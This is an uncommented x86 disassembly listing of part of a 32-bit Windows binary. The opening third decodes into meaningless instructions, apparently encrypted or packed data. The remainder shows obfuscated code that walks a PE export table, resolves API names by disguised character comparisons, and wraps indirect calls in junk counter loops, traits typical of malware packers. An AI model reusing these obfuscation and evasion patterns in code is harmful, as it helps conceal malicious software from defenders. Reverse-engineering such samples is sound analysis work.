  40ff75:	cmp    bl,BYTE PTR [edx+0x0]
  40ff78:	mov    eax,0x81675e3e
  40ff7d:	mov    edx,0xf531d5b4
  40ff82:	cmp    al,0x76
  40ff84:	push   edi
  40ff85:	xchg   ebx,eax
  40ff86:	popa   
  40ff87:	int    0xcf
  40ff89:	dec    esi
  40ff8a:	inc    edi
  40ff8b:	frstor [ebp+0x62]
  40ff8e:	jne    0x40ffca
  40ff90:	jmp    0x40ffd7
  40ff92:	std    
  40ff93:	arpl   WORD PTR [edx-0x314ad027],sp
  40ff99:	sub    eax,0x2d5b5897
  40ff9e:	jbe    0x41001f
  40ffa0:	mov    eax,ds:0x410426e7
  40ffa5:	retf   0x4227
  40ffa8:	std    
  40ffa9:	or     eax,0x500c6003
  40ffae:	cmp    DWORD PTR [ebp+0x42],0x1cda4a99
  40ffb5:	je     0x40ff62
  40ffb7:	je     0x41001e
  40ffb9:	push   ebx
  40ffba:	jns    0x40ff88
  40ffbc:	push   es
  40ffbd:	jg     0x40ffc3
  40ffbf:	mov    ds:0xd8affb02,eax
  40ffc4:	xchg   ebx,eax
  40ffc5:	push   ebx
  40ffc6:	jg     0x40ff7b
  40ffc8:	sub    eax,0xf9e75b85
  40ffcd:	sub    BYTE PTR [edx-0x396b2d2f],ch
  40ffd3:	sub    BYTE PTR [edi],dl
  40ffd5:	xor    eax,0x158f52fe
  40ffda:	cmp    DWORD PTR ds:0x49d14b5a,eax
  40ffe0:	push   ebp
  40ffe1:	or     DWORD PTR [ecx+0x3677ea60],edi
  40ffe7:	cmp    DWORD PTR [eax-0x7a443d5e],esp
  40ffed:	test   BYTE PTR [edx+eax*4],ah
  40fff0:	sbb    al,0x6b
  40fff2:	(bad)  
  40fff3:	das    
  40fff4:	pop    ecx
  40fff5:	pop    ds
  40fff6:	inc    ecx
  40fff7:	into   
  40fff8:	mov    dl,0xf2
  40fffa:	sub    DWORD PTR [eax-0x2f],edx
  40fffd:	popf   
  40fffe:	cld    
  40ffff:	ffreep st(7)
  410001:	push   esp
  410002:	imul   esi,DWORD PTR [ecx],0x5eb9b3f6
  410008:	mov    al,BYTE PTR [ebp-0x74]
  41000b:	mov    ebx,0x66828654
  410010:	sbb    ch,BYTE PTR [edx+0x650001b]
  410016:	jbe    0x410094
  410018:	mov    esi,0xc1b4d30e
  41001d:	push   0x66
  41001f:	xchg   edi,eax
  410020:	out    0x1d,al
  410022:	or     ebx,DWORD PTR [ecx+0x556c1fa9]
  410028:	jo     0x410094
  41002a:	retf   
  41002b:	pop    ds
  41002c:	scas   eax,DWORD PTR es:[edi]
  41002d:	or     DWORD PTR [edx-0x515fe3b6],esi
  410033:	pop    esp
  410034:	test   BYTE PTR ds:0x92937d34,al
  41003a:	sub    eax,0xd78bb175
  41003f:	ror    ch,1
  410041:	test   al,0x80
  410043:	stos   DWORD PTR es:[edi],eax
  410044:	fwait
  410045:	aam    0xf1
  410047:	aas    
  410048:	jmp    0x4100b2
  41004a:	sbb    ebp,0x70
  41004d:	mov    ah,0xcd
  41004f:	lock js 0x41001e
  410052:	xchg   edx,eax
  410053:	mov    esp,0x8337f103
  410058:	addr16 or ecx,edi
  41005b:	mov    esp,0xaa0825fd
  410060:	retf   0xa451
  410063:	dec    edi
  410064:	push   ebx
  410065:	jmp    0x2b5f2f2
  41006a:	mov    ah,0x59
  41006c:	or     eax,0x965214f2
  410071:	out    0xbd,eax
  410073:	xor    bl,BYTE PTR [ecx]
  410075:	neg    BYTE PTR [ecx-0x62a7601f]
  41007b:	mov    al,0x14
  41007d:	push   0x65
  41007f:	gs inc edx
  410081:	stos   BYTE PTR es:[edi],al
  410082:	push   edx
  410083:	mov    edi,edi
  410085:	jge    0x4100f1
  410087:	sahf   
  410088:	arpl   WORD PTR cs:0x57cd442f,bx
  41008f:	adc    DWORD PTR [eax+0x411f9a8f],ecx
  410095:	dec    esp
  410096:	and    eax,0x1d6eff5d
  41009b:	and    eax,0x43f5c53c
  4100a0:	into   
  4100a1:	and    al,0x72
  4100a3:	ins    BYTE PTR es:[edi],dx
  4100a4:	cwde   
  4100a5:	xor    esi,DWORD PTR [ecx-0x57]
  4100a8:	add    BYTE PTR [ecx+0x5f37ba58],ch
  4100ae:	xor    BYTE PTR [eax-0x2097c5af],ch
  4100b4:	int3   
  4100b5:	adc    BYTE PTR [edx+0x717bacbc],al
  4100bb:	and    BYTE PTR [ebx+0x3a4167da],al
  4100c1:	repz rcl dh,0x41
  4100c5:	loope  0x410065
  4100c7:	hlt    
  4100c8:	imul   esi,DWORD PTR [edi+0x44dc7ca1],0x6f7950b5
  4100d2:	inc    ecx
  4100d4:	sbb    ecx,eax
  4100d6:	scas   al,BYTE PTR es:[edi]
  4100d7:	dec    esp
  4100d8:	sub    BYTE PTR [ecx-0x30c956a6],dl
  4100de:	add    eax,0x56366f82
  4100e3:	icebp  
  4100e4:	adc    al,0x9d
  4100e6:	sub    al,0x6f
  4100e8:	jo     0x410135
  4100ea:	pop    esp
  4100eb:	mov    esi,0xe48f5529
  4100f0:	sub    eax,0x19100437
  4100f5:	push   ds
  4100f6:	mov    bl,BYTE PTR [ecx+ecx*4-0x5f]
  4100fa:	retf   0xb81d
  4100fd:	add    eax,0x8a9ca33e
  410103:	in     al,0x6f
  410105:	pop    ebx
  410106:	fisub  DWORD PTR [edi-0x76ffe64d]
  41010c:	aas    
  41010d:	inc    edi
  41010e:	(bad)  
  410110:	fsubr  st,st(3)
  410112:	sub    ch,BYTE PTR [edi]
  410114:	sub    eax,0xb499de90
  410119:	stos   BYTE PTR es:[edi],al
  41011a:	scas   eax,DWORD PTR es:[edi]
  41011b:	fwait
  41011c:	push   ds
  41011d:	dec    ebx
  41011e:	(bad)  [esp+edx*8-0x35]
  410122:	in     al,dx
  410123:	jecxz  0x41012f
  410125:	(bad)  
  410127:	clc    
  410128:	int    0xb3
  41012a:	inc    eax
  41012b:	cmp    DWORD PTR [esi],edi
  41012d:	in     al,dx
  41012e:	or     cl,BYTE PTR [ebx+0x42]
  410131:	jno    0x4101ad
  410133:	dec    esi
  410134:	in     al,dx
  410135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410136:	inc    ebp
  410137:	inc    edx
  410138:	mov    ds:0xd6321a1f,eax
  41013d:	aas    
  41013e:	(bad)  
  41013f:	pop    esi
  410140:	out    0xaf,eax
  410142:	out    0x31,al
  410144:	inc    ebx
  410145:	mov    bl,0x87
  410147:	lock or al,BYTE PTR [eax+0x4b1ec8d5]
  41014e:	ret    0xd7a4
  410151:	mov    ds:0x5aae8ec3,eax
  410156:	cdq    
  410157:	(bad)  
  410159:	repnz mov esp,0xcffc30a
  41015f:	cwde   
  410160:	int    0x74
  410162:	sbb    eax,0x1d223d13
  410167:	arpl   sp,dx
  410169:	lea    ecx,ds:0x5a969639
  41016f:	mov    edi,0x8953d934
  410174:	xchg   edx,eax
  410175:	sbb    DWORD PTR [edx-0x2c],ebx
  410178:	loop   0x4101d9
  41017a:	scas   al,BYTE PTR es:[edi]
  41017b:	nop
  41017c:	cmp    al,BYTE PTR [edi]
  41017e:	add    ah,BYTE PTR cs:[edx+ecx*1]
  410182:	dec    edi
  410183:	sbb    ecx,edx
  410185:	loop   0x410123
  410187:	outs   dx,DWORD PTR ds:[esi]
  410188:	test   al,0x38
  41018a:	or     eax,0x2d623e2
  41018f:	cmp    al,0x5b
  410191:	mov    edi,0x42db0cc8
  410196:	cmp    esi,edi
  410198:	inc    ebp
  410199:	sbb    al,0x2c
  41019b:	xchg   ebx,eax
  41019c:	sub    cl,BYTE PTR [esi+0x6e6ef7a1]
  4101a2:	add    esi,DWORD PTR [edx]
  4101a4:	or     DWORD PTR [ebx],ebp
  4101a6:	dec    edx
  4101a7:	and    DWORD PTR [edi],ebp
  4101a9:	xor    eax,0x7996f5a
  4101ae:	aas    
  4101af:	jle    0x41022a
  4101b1:	mov    cl,0xcd
  4101b3:	sub    eax,0x55dbbd63
  4101b8:	adc    DWORD PTR ds:0x911b9403,edx
  4101be:	je     0x410197
  4101c0:	xchg   BYTE PTR [ecx+0x21b9d615],dh
  4101c6:	lahf   
  4101c7:	test   DWORD PTR [ecx-0x467860ef],ecx
  4101cd:	mov    edx,0xde5c01f3
  4101d2:	mov    ah,0xcd
  4101d4:	movq   mm2,QWORD PTR [esi-0x1c]
  4101d8:	push   ebp
  4101d9:	pushf  
  4101da:	adc    BYTE PTR [ecx],bh
  4101dc:	mov    BYTE PTR [esp+edi*4],ah
  4101df:	(bad)  
  4101e0:	push   0x3731e737
  4101e5:	jbe    0x4101ce
  4101e7:	jmp    0xd490:0x4a517ed6
  4101ee:	arpl   WORD PTR [eax+0x2a],bp
  4101f1:	pop    ss
  4101f2:	inc    esi
  4101f3:	in     al,dx
  4101f4:	arpl   WORD PTR [esi-0x25],ax
  4101f7:	mov    ch,0x8a
  4101f9:	scas   eax,DWORD PTR es:[edi]
  4101fa:	jnp    0x41019a
  4101fc:	sbb    ch,BYTE PTR [esi]
  4101fe:	scas   eax,DWORD PTR es:[edi]
  4101ff:	fistp  QWORD PTR [esi]
  410201:	int3   
  410202:	sbb    al,0x27
  410204:	test   eax,0xdba15334
  410209:	adc    edi,ecx
  41020b:	xchg   esp,eax
  41020c:	mov    BYTE PTR [ebx],al
  41020e:	imul   ebx,DWORD PTR [esi+0x72],0xffffff98
  410212:	jo     0x410285
  410214:	add    BYTE PTR [edi-0x6ef6204e],0x75
  41021b:	jle    0x41023d
  41021d:	or     BYTE PTR [ebx-0x6d],0x9d
  410221:	(bad)  
  410222:	xor    edx,esp
  410224:	xchg   edi,eax
  410225:	(bad)  
  410226:	(bad)  
  410227:	aaa    
  410228:	pushf  
  410229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41022a:	test   eax,0x47350845
  41022f:	jno    0x410252
  410231:	or     ch,dh
  410233:	push   ecx
  410234:	jp     0x410284
  410236:	jg     0x410287
  410238:	sub    BYTE PTR [ecx],bl
  41023a:	xchg   DWORD PTR [esi-0x7d],edi
  41023d:	jb     0x410221
  41023f:	xlat   BYTE PTR ds:[ebx]
  410240:	mov    al,0xdd
  410242:	sub    al,0x23
  410244:	push   ds
  410245:	pop    eax
  410246:	js     0x4102b6
  410248:	add    al,0xa7
  41024a:	popa   
  41024b:	jo     0x410291
  41024d:	cmp    al,0x7a
  41024f:	(bad)  [ecx+0xf]
  410252:	and    eax,0xc4508ff0
  410257:	fs popf 
  410259:	jecxz  0x410286
  41025b:	xor    bh,al
  41025d:	dec    edx
  41025e:	xchg   ebx,eax
  41025f:	or     cl,BYTE PTR [edi+0x61]
  410262:	dec    esp
  410263:	push   ecx
  410264:	mov    edi,0xd79873a
  410269:	aad    0x34
  41026b:	mov    cl,0xa9
  41026d:	xchg   ah,ah
  41026f:	cmp    al,0xcd
  410271:	sub    edx,DWORD PTR [ecx-0x40]
  410274:	xor    DWORD PTR [edx-0x13291d3f],esi
  41027a:	mov    edi,DWORD PTR [ebx-0x75]
  41027d:	pop    ebp
  41027e:	mov    BYTE PTR [eax],cl
  410280:	sbb    ebx,ecx
  410282:	idiv   BYTE PTR cs:[eax-0x3557a5]
  410289:	mov    ebx,0xfcb133ed
  41028e:	rcr    esi,0x8c
  410291:	mov    ds:0x1ce8b40,al
  410296:	daa    
  410297:	xchg   BYTE PTR [edi+0x35],bh
  41029a:	pop    es
  41029b:	or     eax,0xb380e321
  4102a0:	retf   0xc01
  4102a3:	push   di
  4102a5:	add    cl,BYTE PTR [esi+0xc6536eb]
  4102ab:	dec    ecx
  4102ac:	mov    edx,0x5c0fc639
  4102b1:	je     0x410307
  4102b3:	fst    QWORD PTR [eax]
  4102b5:	jbe    0x41024c
  4102b7:	hlt    
  4102b8:	dec    ebx
  4102b9:	sub    al,0x29
  4102bb:	pop    edx
  4102bc:	std    
  4102bd:	lods   al,BYTE PTR ds:[esi]
  4102be:	mov    al,ds:0xcb932463
  4102c3:	adc    DWORD PTR [edx-0x6e70ed81],edx
  4102c9:	(bad)  [edx]
  4102cb:	das    
  4102cc:	call   0x4a3a:0xd63e02b6
  4102d3:	cdq    
  4102d4:	fs dec ebp
  4102d6:	adc    eax,0x1936fde0
  4102db:	ja     0x4102cd
  4102dd:	and    bl,BYTE PTR [ebx-0x7f1dd8a2]
  4102e3:	push   ss
  4102e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e5:	push   eax
  4102e6:	and    dh,BYTE PTR [ecx+0x7081ec2a]
  4102ec:	in     eax,0x13
  4102ee:	jbe    0x410307
  4102f0:	xchg   esp,eax
  4102f1:	mov    ebp,0xf447ad1a
  4102f6:	mov    edx,0xc448740c
  4102fb:	pusha  
  4102fc:	xlat   BYTE PTR ds:[ebx]
  4102fd:	pop    esp
  4102fe:	push   edi
  4102ff:	mov    esi,0xf614fb36
  410304:	inc    ecx
  410305:	cmp    al,0x92
  410307:	es push edi
  410309:	test   BYTE PTR [edx-0x1de280ad],al
  41030f:	push   ds
  410310:	scas   al,BYTE PTR es:[edi]
  410311:	test   DWORD PTR [esi+0x20b6f543],ebp
  410317:	in     eax,0x7b
  410319:	(bad)  
  41031a:	repnz aaa 
  41031c:	ja     0x410320
  41031e:	rol    DWORD PTR ds:[ebp-0xb],0xcd
  410323:	jl     0x41031c
  410325:	js     0x4102fe
  410327:	sbb    eax,0xc5058452
  41032c:	and    ah,al
  41032e:	pop    eax
  41032f:	dec    ecx
  410330:	(bad)  
  410331:	jne    0x41035a
  410333:	out    0x53,al
  410335:	mov    WORD PTR [ebx-0x62928993],es
  41033b:	loop   0x410365
  41033d:	add    al,0xbe
  41033f:	test   BYTE PTR [esi+0x68],dl
  410342:	ja     0x4103ab
  410344:	in     al,0xe8
  410346:	jae    0x41039b
  410348:	les    ebx,FWORD PTR [eax+0xca5101f]
  41034e:	or     bh,ah
  410350:	data16 mov cl,0xb1
  410353:	mov    ds:0xa02481bb,al
  410358:	lahf   
  410359:	lahf   
  41035a:	dec    ecx
  41035b:	inc    eax
  41035c:	xor    al,0x99
  41035e:	mov    esi,DWORD PTR [eax]
  410360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410361:	mov    BYTE PTR [eax-0x2100cffd],0xdd
  410368:	mov    esp,0x31bf10a3
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41e2ac
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x431018,0x0
  41047f:	mov    eax,ds:0x431018
  410484:	inc    eax
  410485:	mov    ds:0x431018,eax
  41048a:	cmp    DWORD PTR ds:0x431018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x42b028
  4104a6:	cmp    DWORD PTR ds:0x431018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x431018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x431018,eax
  4104be:	cmp    DWORD PTR ds:0x431018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x432010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x430010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x430010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x430010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x424682
  4104fb:	call   DWORD PTR ds:0x42b02c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x430010
  410509:	dec    eax
  41050a:	mov    ds:0x430010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x431014
  41051b:	sub    eax,DWORD PTR ds:0x430004
  410521:	mov    ds:0x431014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x432000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x432000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x432000,edi
  410544:	cmp    DWORD PTR ds:0x432000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x432000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x42b030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x430018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x432008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x432008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x432008,edi
  4105b5:	cmp    DWORD PTR ds:0x432008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x432008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x42f020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x42b034
  4105e0:	cmp    DWORD PTR ds:0x432008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x432008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x432008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x433004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x42f020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x42f010,0x432010
  410623:	push   0x41e3c0
  410628:	call   DWORD PTR ds:0x42b040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x42f008,0x432018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x42f018,0x432008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x433004,0x42f020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x43200c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42b00c
  41066f:	xor    DWORD PTR ds:0x431014,0x433004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x43001c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x42f024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42f01c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x42f020,0x433010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x42b024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x42f010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x42f000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x430014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x430008,0x42f010
  4106ec:	mov    DWORD PTR ds:0x41e3bc,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x432014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x430004,0x430010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x430018,0x1f
  410722:	cmp    DWORD PTR ds:0x430018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x430018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x42b038
  41074a:	cmp    DWORD PTR ds:0x430018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x430018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x430018,edi
  410764:	mov    edi,DWORD PTR ds:0x430018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x430018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x433004,0x0
  410780:	mov    esi,DWORD PTR ds:0x433004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x433004,esi
  41078d:	cmp    DWORD PTR ds:0x433004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x43000c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x42b000
  4107b5:	cmp    DWORD PTR ds:0x433004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41e2ac
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x42f010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x42f018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x433010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x431014,0x0
  410807:	mov    edi,DWORD PTR ds:0x431014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x431014,edi
  410814:	cmp    DWORD PTR ds:0x431014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x42b004
  41082c:	cmp    DWORD PTR ds:0x431014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42f01c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x432010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x432010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x432010,edi
  410859:	cmp    DWORD PTR ds:0x432010,0xd
  410860:	jne    0x410874
  410866:	push   0x4246b1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x42b008
  410874:	cmp    DWORD PTR ds:0x432010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x432010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x432010,edi
  41088e:	cmp    DWORD PTR ds:0x432010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41e2ac
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x42f028
  4108bf:	add    DWORD PTR ds:0x431018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x43001c,0x42f018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x42f000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x433010,ebx
  4108e8:	mov    eax,ds:0x41e4a8
  4108ed:	mov    DWORD PTR ds:0x431008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x431000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x431000
  410914:	inc    eax
  410915:	mov    ds:0x431000,eax
  41091a:	cmp    DWORD PTR ds:0x431000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x42b048
  410930:	cmp    DWORD PTR ds:0x431000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41e2ac
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41e4a8,eax
  41095e:	mov    eax,ds:0x41e2ac
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41e2ac
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
